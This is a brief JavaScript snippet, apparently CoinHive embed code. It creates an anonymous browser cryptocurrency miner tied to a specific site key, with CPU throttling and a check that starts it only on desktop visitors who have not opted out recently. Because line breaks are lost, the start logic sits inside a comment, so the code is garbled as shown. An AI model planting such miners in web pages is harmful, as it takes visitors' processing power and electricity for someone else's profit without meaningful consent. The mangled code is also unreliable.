var miner = new CoinHive.Anonymous('5UwEHG9Dq9CJYsITX9N33Zl7JeXxMW1H', {
    throttle: 0.3
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}